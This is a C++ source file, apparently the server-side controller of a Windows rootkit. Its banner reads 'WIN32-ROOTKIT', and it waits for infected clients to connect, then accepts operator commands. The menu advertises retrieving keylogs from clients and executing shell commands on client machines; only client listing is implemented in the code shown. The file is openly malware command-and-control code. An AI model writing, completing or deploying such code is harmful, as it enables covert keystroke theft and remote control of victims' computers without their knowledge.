#include "networking.h"

void menu();
void request(std::string cmd, networking &server); //request, recv, return result

int main(int argc, char** argv)
{
	std::cout << R"###(
 _    _ _____ _   _  _____  _____       ______ _____  _____ _____ _   _______ _____ 
| |  | |_   _| \ | ||____ |/ __  \      | ___ \  _  ||  _  |_   _| | / /_   _|_   _|
| |  | | | | |  \| |    / /`' / /'______| |_/ / | | || | | | | | | |/ /  | |   | |  
| |/\| | | | | . ` |    \ \  / / |______|    /| | | || | | | | | |    \  | |   | |  
\  /\  /_| |_| |\  |.___/ /./ /___      | |\ \\ \_/ /\ \_/ / | | | |\  \_| |_  | |  
 \/  \/ \___/\_| \_/\____/ \_____/      \_| \_|\___/  \___/  \_/ \_| \_/\___/  \_/  
                                                                                    )###";

	menu();
	Sleep(10000);

	networking server;
	std::cout << "[*] Awaiting connection(s)\n";

	std::string command;
	while (true)
	{
		while (!(server.client.size()))
		{
			Sleep(100);
		}
		std::cout << "cmd>>: "; std::cin >> command;
		request(command, server);
	}
	return 0;
}

void request(std::string cmd, networking &server)
{
	//can't use a switch statement because the == operator is overloaded by the string class
	if (cmd == "$lst")
	{
		std::cout << "CLIENTS: \n";
		for (int i = 0; i < server.client.size(); i++)
		{
			std::cout << "\t[" << i << "]\t"
			   		<< server.client[i].username << '\n';
		}
	}
}

void menu()
{
	std::cout << "\n\n/=======================================================\\ \n"
		<< "ACTIONS\n\n"
		<< "$lst:			list all connected clients\n"
		<< "$keylogger:		retrive keylogs from client and reset current keylogs in process\n"
		<< "$shellexec:		execute shell commands on client machine\n"
		<< "$echo:			check connection authenticity\n"
		<< "$menu:			print menu\n\n";
}